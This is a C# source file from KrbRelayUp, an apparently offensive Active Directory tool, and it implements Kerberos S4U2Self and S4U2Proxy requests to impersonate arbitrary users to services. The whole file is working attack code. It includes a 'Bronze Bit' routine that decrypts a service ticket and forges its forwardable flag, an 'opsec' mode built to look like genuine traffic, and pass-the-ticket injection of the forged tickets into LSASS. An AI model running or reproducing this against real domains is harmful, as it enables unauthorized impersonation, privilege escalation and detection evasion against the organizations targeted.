using Asn1;
using KrbRelayUp.lib.Interop;
using System;

namespace KrbRelayUp
{
    class S4U
    {
        public static KRB_CRED S4U2Self(KRB_CRED kirbi, string targetUser, string targetSPN, string outfile, bool ptt, string domainController = "", string altService = "", bool self = false, bool opsec = false, bool bronzebit = false, string keyString = "", Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial, string proxyUrl = null)
        {
            // extract out the info needed for the TGS-REQ/S4U2Self execution
            string userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];
            string domain = kirbi.enc_part.ticket_info[0].prealm;
            Ticket ticket = kirbi.tickets[0];
            byte[] clientKey = kirbi.enc_part.ticket_info[0].key.keyvalue;
            Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype;

            Console.WriteLine("[+] Building S4U2self ");

            byte[] tgsBytes = TGS_REQ.NewTGSReq(userName, domain, userName, ticket, clientKey, etype, Interop.KERB_ETYPE.subkey_keymaterial, false, targetUser, false, false, opsec);

            byte[] response = null;

            if (String.IsNullOrEmpty(proxyUrl))
            {
                string dcIP = Networking.GetDCIP(domainController);
                if (String.IsNullOrEmpty(dcIP)) { return null; }
                Console.WriteLine("[+] Sending S4U2self request to {0}:88", dcIP);
                response = Networking.SendBytes(dcIP, 88, tgsBytes);
            }
            else
            {
                Console.WriteLine("[+] Sending S4U2self request via KDC proxy: {0}", proxyUrl);
                KDC_PROXY_MESSAGE message = new KDC_PROXY_MESSAGE(tgsBytes);
                message.target_domain = domain;
                response = Networking.MakeProxyRequest(proxyUrl, message);
            }
            if (response == null)
            {
                return null;
            }

            // decode the supplied bytes to an AsnElt object
            //  false == ignore trailing garbage
            AsnElt responseAsn = AsnElt.Decode(response, false);

            // check the response value
            int responseTag = responseAsn.TagValue;

            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.TGS_REP)
            {
                Console.WriteLine("[+] S4U2self success!");

                // parse the response to an TGS-REP
                TGS_REP rep = new TGS_REP(responseAsn);
                // KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY = 8
                byte[] outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, clientKey, rep.enc_part.cipher);
                AsnElt ae = AsnElt.Decode(outBytes, false);
                EncKDCRepPart encRepPart = new EncKDCRepPart(ae.Sub[0]);

                // now build the final KRB-CRED structure
                KRB_CRED cred = new KRB_CRED();

                // if we want to use this s4u2self ticket for authentication, change the sname
                if (!String.IsNullOrEmpty(altService) && self)
                {
                    rep.ticket.sname.name_string[0] = altService.Split('/')[0];
                    rep.ticket.sname.name_string.Add(altService.Split('/')[1]);
                }

                // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart

                KrbCredInfo info = new KrbCredInfo();

                // [0] add in the session key
                info.key.keytype = encRepPart.key.keytype;
                info.key.keyvalue = encRepPart.key.keyvalue;

                // [1] prealm (domain)
                info.prealm = encRepPart.realm;

                // [2] pname (user)
                info.pname.name_type = rep.cname.name_type;
                info.pname.name_string = rep.cname.name_string;

                // [3] flags
                info.flags = encRepPart.flags;
                if (bronzebit && !String.IsNullOrEmpty(keyString))
                {
                    Console.WriteLine("[+] Bronze Bit flag passed, flipping forwardable flag on. Original flags: {0}", info.flags);
                    info.flags |= Interop.TicketFlags.forwardable;

                    // get user longterm key from keyString
                    byte[] key = Helpers.StringToByteArray(keyString);

                    // decrypt and decode ticket encpart
                    var decTicketPart = rep.ticket.Decrypt(key, null, true);

                    // modify flags
                    decTicketPart.flags |= Interop.TicketFlags.forwardable;

                    // encode and encrypt ticket encpart
                    byte[] encTicketData = decTicketPart.Encode().Encode();
                    byte[] encTicketPart = Crypto.KerberosEncrypt((Interop.KERB_ETYPE)rep.ticket.enc_part.etype, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, key, encTicketData);
                    rep.ticket.enc_part = new EncryptedData(rep.ticket.enc_part.etype, encTicketPart, rep.ticket.enc_part.kvno);
                    Console.WriteLine("[+] Flags changed to: {0}", info.flags);
                }

                // add the ticket
                cred.tickets.Add(rep.ticket);

                // [4] authtime (not required)

                // [5] starttime
                info.starttime = encRepPart.starttime;

                // [6] endtime
                info.endtime = encRepPart.endtime;

                // [7] renew-till
                info.renew_till = encRepPart.renew_till;

                // [8] srealm
                info.srealm = encRepPart.realm;

                // [9] sname
                info.sname.name_type = encRepPart.sname.name_type;
                info.sname.name_string = encRepPart.sname.name_string;

                // if we want to use the s4u2self change the sname here too
                if (!String.IsNullOrEmpty(altService) && self)
                {
                    Console.WriteLine("[+] Substituting alternative service name '{0}'", altService);
                    info.sname.name_string[0] = altService.Split('/')[0];
                    info.sname.name_string.Add(altService.Split('/')[1]);
                }

                // add the ticket_info into the cred object
                cred.enc_part.ticket_info.Add(info);

                byte[] kirbiBytes = cred.Encode().Encode();

                string kirbiString = Convert.ToBase64String(kirbiBytes);

                Console.WriteLine("[+] Got a TGS for '{0}' to '{1}@{2}'", info.pname.name_string[0], info.sname.name_string[0], info.srealm);

                if (!String.IsNullOrEmpty(outfile))
                {
                    string filename = $"{Helpers.GetBaseFromFilename(outfile)}_{info.pname.name_string[0]}_to_{info.sname.name_string[0]}@{info.srealm}{Helpers.GetExtensionFromFilename(outfile)}";
                    filename = Helpers.MakeValidFileName(filename);
                    if (Helpers.WriteBytesToFile(filename, kirbiBytes))
                    {
                        Console.WriteLine("\r\n[+] Ticket written to {0}\r\n", filename);
                    }
                }

                if (ptt && self)
                {
                    // pass-the-ticket -> import into LSASS
                    LSA.ImportTicket(kirbiBytes, new LUID());
                }

                return cred;
            }
            else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
            {
                // parse the response to an KRB-ERROR
                KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
                Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
            }
            else
            {
                Console.WriteLine("\r\n[X] Unknown application tag: {0}", responseTag);
            }

            return null;
        }

        public static byte[] S4U2Proxy(KRB_CRED kirbi, string targetUser, string targetSPN, string outfile, bool ptt, string domainController = "", KRB_CRED tgs = null, bool opsec = false, string proxyUrl = null)
        {
            Console.WriteLine("[+] Impersonating user '{0}' to target SPN '{1}'", targetUser, targetSPN);

            // extract out the info needed for the TGS-REQ/S4U2Proxy execution
            string userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];
            string domain = kirbi.enc_part.ticket_info[0].prealm;
            Ticket ticket = kirbi.tickets[0];
            byte[] clientKey = kirbi.enc_part.ticket_info[0].key.keyvalue;
            Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype;

            Console.WriteLine("[+] Building S4U2proxy request for service: '{0}'", targetSPN);
            TGS_REQ s4u2proxyReq = new TGS_REQ(!opsec);

            s4u2proxyReq.req_body.kdcOptions = s4u2proxyReq.req_body.kdcOptions | Interop.KdcOptions.CONSTRAINED_DELEGATION;

            s4u2proxyReq.req_body.realm = domain;

            string[] parts = targetSPN.Split('/');
            string serverName = parts[parts.Length - 1];

            s4u2proxyReq.req_body.sname.name_type = Interop.PRINCIPAL_TYPE.NT_SRV_INST;
            foreach (string part in parts)
            {
                s4u2proxyReq.req_body.sname.name_string.Add(part);
            }

            // supported encryption types
            s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.aes128_cts_hmac_sha1);
            s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.aes256_cts_hmac_sha1);
            s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.rc4_hmac);

            // add in the ticket from the S4U2self response
            s4u2proxyReq.req_body.additional_tickets.Add(tgs.tickets[0]);

            // needed for authenticator checksum
            byte[] cksum_Bytes = null;

            // the rest of the opsec changes
            if (opsec)
            {
                // remove renewableok and add canonicalize
                s4u2proxyReq.req_body.kdcOptions = s4u2proxyReq.req_body.kdcOptions & ~Interop.KdcOptions.RENEWABLEOK;
                s4u2proxyReq.req_body.kdcOptions = s4u2proxyReq.req_body.kdcOptions | Interop.KdcOptions.CANONICALIZE;

                // 15 minutes in the future like genuine requests
                DateTime till = DateTime.Now;
                till = till.AddMinutes(15);
                s4u2proxyReq.req_body.till = till;

                // extra etypes
                s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.rc4_hmac_exp);
                s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.old_exp);

                // encode req_body for authenticator cksum
                AsnElt req_Body_ASN = s4u2proxyReq.req_body.Encode();
                AsnElt req_Body_ASNSeq = AsnElt.Make(AsnElt.SEQUENCE, new[] { req_Body_ASN });
                req_Body_ASNSeq = AsnElt.MakeImplicit(AsnElt.CONTEXT, 4, req_Body_ASNSeq);
                byte[] req_Body_Bytes = req_Body_ASNSeq.CopyValue();
                cksum_Bytes = Crypto.KerberosChecksum(clientKey, req_Body_Bytes, Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_RSA_MD5);
            }

            // moved to end so we can have the checksum in the authenticator
            PA_DATA padata = new PA_DATA(domain, userName, ticket, clientKey, etype, opsec, cksum_Bytes);
            s4u2proxyReq.padata.Add(padata);
            PA_DATA pac_options = new PA_DATA(false, false, false, true);
            s4u2proxyReq.padata.Add(pac_options);

            byte[] s4ubytes = s4u2proxyReq.Encode().Encode();

            byte[] response2 = null;

            if (String.IsNullOrEmpty(proxyUrl))
            {
                string dcIP = Networking.GetDCIP(domainController);
                if (String.IsNullOrEmpty(dcIP)) { return null; }

                Console.WriteLine("[+] Sending S4U2proxy request to domain controller {0}:88", dcIP);

                response2 = Networking.SendBytes(dcIP, 88, s4ubytes);
            }
            else
            {
                Console.WriteLine("[+] Sending S4U2proxy request via KDC proxy: {0}", proxyUrl);
                KDC_PROXY_MESSAGE message = new KDC_PROXY_MESSAGE(s4ubytes);
                message.target_domain = domain;
                response2 = Networking.MakeProxyRequest(proxyUrl, message);
            }
            if (response2 == null)
            {
                return null;
            }

            // decode the supplied bytes to an AsnElt object
            //  false == ignore trailing garbage
            AsnElt responseAsn = AsnElt.Decode(response2, false);

            // check the response value
            int responseTag = responseAsn.TagValue;

            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.TGS_REP)
            {
                Console.WriteLine("[+] S4U2proxy success!");

                // parse the response to an TGS-REP
                TGS_REP rep2 = new TGS_REP(responseAsn);

                // https://github.com/gentilkiwi/kekeo/blob/master/modules/asn1/kull_m_kerberos_asn1.h#L62
                byte[] outBytes2 = Crypto.KerberosDecrypt(etype, 8, clientKey, rep2.enc_part.cipher);
                AsnElt ae2 = AsnElt.Decode(outBytes2, false);
                EncKDCRepPart encRepPart2 = new EncKDCRepPart(ae2.Sub[0]);

                
                // now build the final KRB-CRED structure, no alternate snames
                KRB_CRED cred = new KRB_CRED();

                // add the ticket
                cred.tickets.Add(rep2.ticket);

                // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart

                KrbCredInfo info = new KrbCredInfo();

                // [0] add in the session key
                info.key.keytype = encRepPart2.key.keytype;
                info.key.keyvalue = encRepPart2.key.keyvalue;

                // [1] prealm (domain)
                info.prealm = encRepPart2.realm;

                // [2] pname (user)
                info.pname.name_type = rep2.cname.name_type;
                info.pname.name_string = rep2.cname.name_string;

                // [3] flags
                info.flags = encRepPart2.flags;

                // [4] authtime (not required)

                // [5] starttime
                info.starttime = encRepPart2.starttime;

                // [6] endtime
                info.endtime = encRepPart2.endtime;

                // [7] renew-till
                info.renew_till = encRepPart2.renew_till;

                // [8] srealm
                info.srealm = encRepPart2.realm;

                // [9] sname
                info.sname.name_type = encRepPart2.sname.name_type;
                info.sname.name_string = encRepPart2.sname.name_string;

                // add the ticket_info into the cred object
                cred.enc_part.ticket_info.Add(info);

                byte[] kirbiBytes = cred.Encode().Encode();

                string kirbiString = Convert.ToBase64String(kirbiBytes);

                if (!String.IsNullOrEmpty(outfile))
                {
                    string filename = $"{Helpers.GetBaseFromFilename(outfile)}_{targetSPN}{Helpers.GetExtensionFromFilename(outfile)}";
                    filename = Helpers.MakeValidFileName(filename);
                    if (Helpers.WriteBytesToFile(filename, kirbiBytes))
                    {
                        Console.WriteLine("\r\n[+] Ticket written to {0}\r\n", filename);
                    }
                }

                if (ptt)
                {
                    // pass-the-ticket -> import into LSASS
                    LSA.ImportTicket(kirbiBytes, new LUID());
                }
                return kirbiBytes;
            }
            else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
            {
                // parse the response to an KRB-ERROR
                KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
                Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
            }
            else
            {
                Console.WriteLine("\r\n[X] Unknown application tag: {0}", responseTag);
            }
            return null;
        }
        
    }
}
